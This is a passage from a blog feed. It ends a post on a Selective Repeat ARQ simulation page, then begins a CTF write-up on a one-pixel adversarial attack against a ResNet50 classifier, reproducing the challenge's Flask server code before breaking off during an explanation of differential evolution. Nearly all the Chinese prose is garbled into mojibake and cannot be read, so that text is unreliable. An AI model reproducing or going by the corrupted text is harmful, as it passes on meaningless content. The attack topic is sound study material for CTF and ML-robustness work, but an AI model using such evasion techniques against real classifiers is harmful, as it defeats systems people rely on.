class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;main&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:80%;margin: 0 auto;&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;border: 2px dotted #575757;&quot;</span>&gt;</span>Selective Repeat ARQ Simulation<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://kyriota.com/2023/01/03/SelectiveRepeatARQ-Simulation/&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;color: #F378BF;&quot;</span>&gt;</span>click here for help and detail<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;host0&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:50%;float:left;&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;height: 0px;color: yellow;&quot;</span>&gt;</span>User Input<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">&quot;host0_userInput&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;60&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">rows</span>=<span class="string">&quot;4&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">style</span>=<span class="string">&quot;background-color: #191b20;color:white;&quot;</span>&gt;</span>@kyriota My name is kira yoshikake, 33 years old. Living in the villa area northeast of duwangting, unmarried. I work in Guiyou chain store. Every day I have to work overtime until 8 p.m. to go home. I don&#x27;t smoke. The wine is only for a taste. Sleep at 11 p.m. for 8 hours a day. Before I go to bed, I must drink a cup of warm milk, then do 20 minutes of soft exercise, get on the bed, and immediately fall asleep. Never leave fatigue and stress until the next day. Doctors say I&#x27;m normal. JOJO, people&#x27;s ability is limited. I learned one thing from my short life... The more scheming I am, the more I will find that human ability is limited... Unless I surpass human. I&#x27;m going to give up my human identity! JOJO! &quot;I don&#x27;t want violent happiness Instead, there is no deep despair To pursue a plant like life and live a peaceful life is my goal... &quot;<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;host0_sendButton&quot;</span>&gt;</span>Send<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;height: 0px;color: yellow;&quot;</span>&gt;</span>Frame Sender Buffer<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;host0_frameSenderBuffer&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">style</span>=<span class="string">&quot;width:90%;height:68px;border:1px solid white;overflow-y:scroll;text-align: left;padding: 2px;&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;host0_frameSenderBufferLog&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">style</span>=<span class="string">&quot;width:90%;height:72px;border:1px dotted rgb(63, 63, 63);text-align: left;padding: 2px;overflow-y: auto;font-size: 2px;&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;height: 0px;color: yellow;&quot;</span>&gt;</span>Receive Bin Buffer<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;host0_receiveBinBuffer&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">style</span>=<span class="string">&quot;width:90%;height:72px;border:1px solid white;overflow-y:scroll;text-align: left;padding: 2px;&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;host0_receiveBinBufferLog&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">style</span>=<span class="string">&quot;width:90%;height:72px;border:1px dotted rgb(63, 63, 63);text-align: left;padding: 2px;overflow-y: auto;font-size: 2px;&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;height: 0px;color: yellow;&quot;</span>&gt;</span>Frame Receiver Buffer<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;host0_frameReceiverBuffer&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:90%;height:40px;text-align: left;padding: 2px;&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;height: 0px;color: yellow;&quot;</span>&gt;</span>Message<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">&quot;host0_message&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;60&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;5&quot;</span> <span class="attr">disabled</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">style</span>=<span class="string">&quot;background-color: #23252F;color:white;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;host1&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:50%;float:left;&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">center</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;height: 0px;color: yellow;&quot;</span>&gt;</span>User Input<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">&quot;host1_userInput&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;60&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">rows</span>=<span class="string">&quot;4&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">style</span>=<span class="string">&quot;background-color: #191b20;color:white;&quot;</span>&gt;</span>@kyriota &quot;When I was in primary school, there were dozens of signatures on my classmates&#x27; graduation album, but I didn&#x27;t have them. My mother had them, my father had them, but I didn&#x27;t. There were tens of thousands of fans of pop stars and movie stars, but I didn&#x27;t have them.&quot; &quot;In my life, it&#x27;s impossible to meet real friends. It&#x27;s impossible for me to connect with people who can&#x27;t see the green emperor.&quot; &quot;It&#x27;s 5:15 in Cairo now. Japan has jet lag. It should be midnight. What are my parents doing? Have you slept? I want you to worry, sorry... &quot; &quot;The last emerald spray... I have... Tried my best... This is me, the last rumor... Mr. josda... Please accept it.&quot; ------Hua Jing Yuan Dian Ming Hua Jing Yuan Dian Ming Death. With a regretless smile on his face, he ended his life at the age of 17<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">id</span>=<span class="string">&quot;host1_sendButton&quot;</span>&gt;</span>Send<span class="tag">&lt;/<span class="name">button</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;height: 0px;color: yellow;&quot;</span>&gt;</span>Frame Sender Buffer<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;host1_frameSenderBuffer&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">style</span>=<span class="string">&quot;width:90%;height:68px;border:1px solid white;overflow-y:scroll;text-align: left;padding: 2px;&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;host1_frameSenderBufferLog&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">style</span>=<span class="string">&quot;width:90%;height:72px;border:1px dotted rgb(63, 63, 63);text-align: left;padding: 2px;overflow-y: auto;font-size: 2px;&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;height: 0px;color: yellow;&quot;</span>&gt;</span>Receive Bin Buffer<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;host1_receiveBinBuffer&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">style</span>=<span class="string">&quot;width:90%;height:72px;border:1px solid white;overflow-y:scroll;text-align: left;padding: 2px;&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;host1_receiveBinBufferLog&quot;</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">style</span>=<span class="string">&quot;width:90%;height:72px;border:1px dotted rgb(63, 63, 63);text-align: left;padding: 2px;overflow-y: auto;font-size: 2px;&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;height: 0px;color: yellow;&quot;</span>&gt;</span>Frame Receiver Buffer<span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;host1_frameReceiverBuffer&quot;</span> <span class="attr">style</span>=<span class="string">&quot;width:90%;height:40px;text-align: left;padding: 2px;&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">div</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;height: 0px;color: yellow;&quot;</span>&gt;</span>Message<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">br</span>&gt;</span><span class="tag">&lt;<span class="name">textarea</span> <span class="attr">id</span>=<span class="string">&quot;host1_message&quot;</span> <span class="attr">cols</span>=<span class="string">&quot;60&quot;</span> <span class="attr">rows</span>=<span class="string">&quot;5&quot;</span> <span class="attr">disabled</span></span></span><br><span class="line"><span class="tag">                    <span class="attr">style</span>=<span class="string">&quot;background-color: #23252F;color:white;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;ARQ_Simulator.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="javascript">        <span class="comment">// resize the receive bin buffer divs when the window is resized</span></span></span><br><span class="line"><span class="javascript">        <span class="function"><span class="keyword">function</span> <span class="title">ResizeUI</span>(<span class="params"></span>) </span>&#123;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> temp = <span class="number">121</span>;</span></span><br><span class="line"><span class="javascript">            <span class="keyword">var</span> base = <span class="built_in">window</span>.innerWidth / <span class="number">3</span>;</span></span><br><span class="line"><span class="javascript">            <span class="comment">// resize all the divs</span></span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;host0_receiveBinBuffer&quot;</span>).style.width = (base - base % temp) + <span class="string">&quot;px&quot;</span>;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;host1_receiveBinBuffer&quot;</span>).style.width = (base - base % temp) + <span class="string">&quot;px&quot;</span>;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;host0_frameSenderBuffer&quot;</span>).style.width = (base - base % temp) + <span class="string">&quot;px&quot;</span>;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;host1_frameSenderBuffer&quot;</span>).style.width = (base - base % temp) + <span class="string">&quot;px&quot;</span>;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;host0_frameReceiverBuffer&quot;</span>).style.width = (base - base % temp) + <span class="string">&quot;px&quot;</span>;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;host1_frameReceiverBuffer&quot;</span>).style.width = (base - base % temp) + <span class="string">&quot;px&quot;</span>;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;host0_frameSenderBufferLog&quot;</span>).style.width = (base - base % temp) + <span class="string">&quot;px&quot;</span>;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;host1_frameSenderBufferLog&quot;</span>).style.width = (base - base % temp) + <span class="string">&quot;px&quot;</span>;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;host0_receiveBinBufferLog&quot;</span>).style.width = (base - base % temp) + <span class="string">&quot;px&quot;</span>;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;host1_receiveBinBufferLog&quot;</span>).style.width = (base - base % temp) + <span class="string">&quot;px&quot;</span>;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;host0_userInput&quot;</span>).style.width = (base - base % temp) + <span class="string">&quot;px&quot;</span>;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;host1_userInput&quot;</span>).style.width = (base - base % temp) + <span class="string">&quot;px&quot;</span>;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;host0_message&quot;</span>).style.width = (base - base % temp) + <span class="string">&quot;px&quot;</span>;</span></span><br><span class="line"><span class="javascript">            <span class="built_in">document</span>.getElementById(<span class="string">&quot;host1_message&quot;</span>).style.width = (base - base % temp) + <span class="string">&quot;px&quot;</span>;</span></span><br><span class="line">        &#125;</span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.addEventListener(<span class="string">&quot;resize&quot;</span>, ResizeUI);</span></span><br><span class="line">        ResizeUI();</span><br><span class="line">    <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>    </div></div><h2 id="Postscript"><a href="#Postscript" class="headerlink" title="Postscript"></a>Postscript</h2><p>I highly recommend using emoji or something intuitive in your log text when possible, which can increase your reading speed of log text significantly</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> è¯¾å†… </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>One Pixel Attack With Differential Evolution</title>
      <link href="2022/12/12/OnePixelAttackWithDifferentialEvolution/"/>
      <url>2022/12/12/OnePixelAttackWithDifferentialEvolution/</url>
      
        <content type="html"><![CDATA[<p>RCTFå‡ºäº†ä¸ªOnePixelAttackçš„é¢˜ï¼Œå¾ˆæ—©å°±çœ‹è§è¿‡è¿™ä¸ªæ”»å‡»äº†ï¼Œäºæ˜¯å°è¯•ä¸€ä¸‹</p><span id="more"></span><!--toc--><h1 id="One-Pixel-Attack-With-Differential-Evolution"><a href="#One-Pixel-Attack-With-Differential-Evolution" class="headerlink" title="One Pixel Attack With Differential Evolution"></a>One Pixel Attack With Differential Evolution</h1><p>OnePixelAttacké¡¾åæ€ä¹‰ï¼Œåªä¿®æ”¹ä¸€ä¸ªåƒç´ æ¥éª—è¿‡Classfierï¼Œç©çš„éå¸¸æé™ï¼Œä¸€å¼€å§‹æˆ‘ä»¥ä¸ºè¿™æ ·çš„æ”»å‡»ä¸€å®šç¦»ä¸å¼€æ¢¯åº¦ï¼Œä½†å±…ç„¶æ˜¯ç”¨äº†å·®åˆ†æ¼”åŒ–è¿™ä¸€ä¼˜åŒ–ç®—æ³•ï¼Œå¯ä»¥å®Œå…¨åšåˆ°BlackBoxæ”»å‡»ï¼Œåªéœ€è¦çŸ¥é“Classfierç»™å‡ºçš„Probabilityä¸Labelå³å¯</p><p>å¹¸è¿çš„æ˜¯ï¼Œä½¿ç”¨å·®åˆ†æ¼”åŒ–çš„OnePixelAttackåœ¨æå®æ¯…çš„Channelä¸Šæœ‰è¿‡è®²è§£ï¼Œ<a href="https://www.youtube.com/watch?v=tfpKIZIWidA">è§†é¢‘åœ¨æ­¤</a>ï¼Œçœ‹ä¸¤éå·®åˆ†æ¼”åŒ–çš„éƒ¨åˆ†åå°±å¯ä»¥å°è¯•è‡ªå·±æ“ä¸€ä¸ªæ¥è§£é¢˜äº†</p><h2 id="é¢˜ç›®å¤è¿°"><a href="#é¢˜ç›®å¤è¿°" class="headerlink" title="é¢˜ç›®å¤è¿°"></a>é¢˜ç›®å¤è¿°</h2><p>æœ¬æ¬¡RCTFç»™å‡ºçš„è¢«æ”»å‡»çš„modelæ˜¯ResNet50ï¼Œåˆ†ç±»ç»“æœçš„ç±»åˆ«æ•°é‡é«˜è¾¾1000ä¸ªï¼Œéœ€è¦è¿›è¡Œæ‰°åŠ¨çš„æ ·æœ¬æ˜¯ä¸€å¼ 60x60çš„çŒ«å’ªå›¾ç‰‡ï¼Œéœ€è¦å¯¹å…¶è¿›è¡Œä¸€ä¸ªåƒç´ çš„æ‰°åŠ¨ä½¿å…¶è¢«åˆ†ç±»ä¸ºä¸æ˜¯çŒ«å’ªçš„ç±»åˆ«ï¼Œä»¥ä¸‹ä¸ºåŸé¢˜å‰ç«¯ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request</span><br><span class="line"><span class="keyword">from</span> torchvision.models <span class="keyword">import</span> resnet50, ResNet50_Weights</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkImg</span>(<span class="params">Img</span>):</span></span><br><span class="line">    im = Image.<span class="built_in">open</span>(<span class="string">&#x27;static/start.png&#x27;</span>).convert(<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line">    Img = Img.convert(<span class="string">&#x27;RGB&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> Img.size != (<span class="number">60</span>, <span class="number">60</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>):</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>):</span><br><span class="line">            <span class="keyword">if</span> im.getpixel((i,j)) != Img.getpixel((i,j)):</span><br><span class="line">                count += <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> count == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">divide</span>(<span class="params">img</span>):</span></span><br><span class="line">  <span class="comment"># Step 1: Initialize model with the best available weights</span></span><br><span class="line">  weights = ResNet50_Weights.DEFAULT</span><br><span class="line">  model = resnet50(weights=weights)</span><br><span class="line">  model.<span class="built_in">eval</span>()</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Step 2: Initialize the inference transforms</span></span><br><span class="line">  preprocess = weights.transforms()</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Step 3: Apply inference preprocessing transforms</span></span><br><span class="line">  batch = preprocess(img).unsqueeze(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">  <span class="comment"># Step 4: Use the model and print the predicted category</span></span><br><span class="line">  prediction = model(batch).squeeze(<span class="number">0</span>).softmax(<span class="number">0</span>)</span><br><span class="line">  class_id = prediction.argmax().item()</span><br><span class="line">  score = prediction[class_id].item()</span><br><span class="line">  category_name = weights.meta[<span class="string">&quot;categories&quot;</span>][class_id]</span><br><span class="line">  <span class="keyword">return</span> category_name,score</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">welcome</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        f = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">        im = Image.<span class="built_in">open</span>(f)</span><br><span class="line">        <span class="keyword">if</span> checkImg(im) == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>, error=<span class="string">&quot;image format error! the image size must be 60 x 60 and you can only change one pixel!&quot;</span>)</span><br><span class="line">        category_name,score = divide(im)</span><br><span class="line">        <span class="keyword">if</span> category_name == <span class="string">&#x27;tabby&#x27;</span> <span class="keyword">or</span> <span class="string">&quot;cat&quot;</span> <span class="keyword">in</span> category_name:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>, res=category_name + <span class="string">&quot;  &quot;</span> + <span class="built_in">str</span>(score))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>, flag=flag)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>,error=<span class="string">&#x27;please start attack!&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>éœ€è¦è¿›è¡Œæ‰°åŠ¨çš„æ ·æœ¬ï¼š</p><p><img src="/images/OnePixelAttackWithDE_Sample.png"></p><h2 id="å·®åˆ†æ¼”åŒ–"><a href="#å·®åˆ†æ¼”åŒ–" class="headerlink" title="å·®åˆ†æ¼”åŒ–"></a>å·®åˆ†æ¼”åŒ–</h2><p>é¦–å…ˆè®¤è¯†å·®åˆ†æ¼”åŒ–ï¼Œç®€ç§°DE</p><center><code>DE(func, cutoff, popSize, mut, CR, maxIter)</code></center><p>è§‚å¯Ÿä¸Šè¿°å‡½æ•°å‚æ•°ï¼š</p><ul><li><code>func</code>ï¼šç›®æ ‡å‡½æ•°</li><li><code>cutoff</code>ï¼šé˜ˆå€¼</li><li><code>popSize</code>ï¼šæ—ç¾¤å¤§å°</li><li><code>mut</code>ï¼šè¿›åŒ–å‚æ•°</li><li><code>CR</code>ï¼šæ‚äº¤å‚æ•°</li><li><code>maxIter</code>ï¼šæœ€å¤§è¿­ä»£æ¬¡æ•°</li></ul><p>æˆ‘ä»¬æœŸæœ›ä¸Šè¿°å‡½æ•°åœ¨<code>maxIter</code>å†…æ‰¾åˆ°ä¸€ä¸ªå‘é‡<code>X</code>ï¼Œä½¿<code>func(X)</code>çš„å€¼å¤§äºæˆ–å°äºï¼ˆè¿™å–å†³äºç»“æœçš„éœ€æ±‚ï¼‰<code>cutoff</code></p><h3 id="å…·ä½“æµç¨‹"><a href="#å…·ä½“æµç¨‹" class="headerlink" 